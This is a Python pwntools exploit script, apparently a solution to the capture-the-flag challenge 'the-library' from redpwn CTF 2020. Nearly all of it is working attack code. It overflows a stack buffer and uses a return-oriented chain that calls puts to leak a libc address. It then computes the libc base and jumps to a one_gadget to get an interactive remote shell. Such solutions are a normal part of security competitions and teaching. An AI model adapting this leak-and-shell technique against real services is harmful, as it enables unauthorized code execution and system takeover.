from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./the-library"
HOST = "2020.redpwnc.tf"
PORT = 31350

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc.so.6')
off_puts = libc.symbols["puts"]
#libc_binsh = next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

rdi_ret = 0x400733
only_ret = 0x400506

def exploit():
	bufsize = 0x10+8	
	payload = "A"*bufsize
	payload += p64(rdi_ret)
	payload += p64(got_puts)
	payload += p64(plt_puts)
	payload += p64(addr_main)
	conn.sendlineafter("name?\n",payload)
	conn.recvline()
	conn.recvline()
	libc_puts = u64(conn.recv(6) + "\x00\x00")
	libc_base = libc_puts - off_puts
	one_gadget = libc_base + gadget[0]
	print hex(libc_base)
	
	payload = "\x00"*bufsize
	payload += p64(one_gadget)
	conn.sendlineafter("name?\n",payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
